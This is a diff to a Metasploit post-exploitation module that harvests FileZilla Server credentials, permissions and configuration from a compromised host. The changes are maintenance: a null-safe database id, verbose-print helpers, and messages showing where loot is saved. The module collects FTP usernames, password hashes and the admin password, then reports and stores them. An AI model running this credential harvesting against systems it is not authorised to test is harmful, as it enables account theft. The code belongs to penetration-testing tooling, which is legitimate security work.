@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -148,16 +148,22 @@ class Metasploit3 < Msf::Post
 		creds.each do |cred|
 			credentials << [cred['host'], cred['port'], cred['user'], cred['password'], cred['ssl']]
 
+			if session.db_record
+				source_id = session.db_record.id
+			else
+				source_id = nil
+			end
+
 			# report the goods!
 			report_auth_info(
-				:host  => session,
+				:host  => session.sock.peerhost,
 				:port => config['ftp_port'],
 				:sname => 'ftp',
 				:proto => 'tcp',
 				:user => cred['user'],
 				:pass => cred['password'],
 				:ptype => "MD5 hash",
-				:source_id => session.db_record.id,
+				:source_id => source_id,
 				:source_type => "exploit",
 				:target_host => config['ftp_bindip'],
 				:target_port => config['ftp_port']
@@ -169,43 +175,51 @@ class Metasploit3 < Msf::Post
 			perm['dircreate'], perm['dirdelete'], perm['dirlist'], perm['dirsubdirs'], perm['autocreate']]
 		end
 
-		if datastore['VERBOSE']
-			print_status("    Collected the following configuration details:")
-			print_status("       FTP Port: %s" % config['ftp_port'])
-			print_status("    FTP Bind IP: %s" % config['ftp_bindip'])
-			print_status("            SSL: %s" % config['ssl'])
-			print_status("     Admin Port: %s" % config['admin_port'])
-			print_status("  Admin Bind IP: %s" % config['admin_bindip'])
-			print_status("     Admin Pass: %s" % config['admin_pass'])
-			print_line("")
-		end
+		vprint_status("    Collected the following configuration details:")
+		vprint_status("       FTP Port: %s" % config['ftp_port'])
+		vprint_status("    FTP Bind IP: %s" % config['ftp_bindip'])
+		vprint_status("            SSL: %s" % config['ssl'])
+		vprint_status("     Admin Port: %s" % config['admin_port'])
+		vprint_status("  Admin Bind IP: %s" % config['admin_bindip'])
+		vprint_status("     Admin Pass: %s" % config['admin_pass'])
+		vprint_line("")
 
 		configuration << [config['ftp_port'], config['ftp_bindip'], config['admin_port'], config['admin_bindip'], config['admin_pass'],
 			config['ssl'], config['ssl_certfile'], config['ssl_keypass']]
-
+			if session.db_record
+				source_id = session.db_record.id
+			else
+				source_id = nil
+			end
 			# report the goods!
 			report_auth_info(
 				:host  => session,
 				:port => config['admin_port'],
-				:sname => 'filezilla-server-admin-interface',
+				:sname => 'filezilla-admin',
 				:proto => 'tcp',
 				:user => 'admin',
 				:pass => config['admin_pass'],
 				:type => "password",
-				:source_id => session.db_record.id,
+				:source_id => source_id,
 				:source_type => "exploit",
 				:target_host => config['admin_bindip'],
 				:target_port => config['admin_port']
 			)
 
-		store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
+		p = store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
 			"filezilla_server_credentials.csv", "FileZilla FTP Server Credentials")
 
-		store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv,
+		print_status("Credentials saved in: #{p.to_s}")
+
+		p = store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv,
 			"filezilla_server_permissions.csv", "FileZilla FTP Server Permissions")
 
-		store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv,
+		print_status("Permissions saved in: #{p.to_s}")
+
+		p = store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv,
 			"filezilla_server_configuration.csv", "FileZilla FTP Server Configuration")
+
+		print_status("Config saved in: #{p.to_s}")
 	end
 
 	def parse_server(data)
@@ -321,13 +335,11 @@ class Metasploit3 < Msf::Post
 			account['ssl']  = settings['ssl']
 			creds << account
 
-			if datastore['VERBOSE']
-				print_status("    Collected the following credentials:")
-				print_status("    Username: %s" % account['user'])
-				print_status("    Password: %s" % account['password'])
-				print_status("       Group: %s" % account['group'])
-				print_line("")
-			end
+			vprint_status("    Collected the following credentials:")
+			vprint_status("    Username: %s" % account['user'])
+			vprint_status("    Password: %s" % account['password'])
+			vprint_status("       Group: %s" % account['group'])
+			vprint_line("")
 		end
 
 		groups = groups.uniq unless groups.uniq.nil?
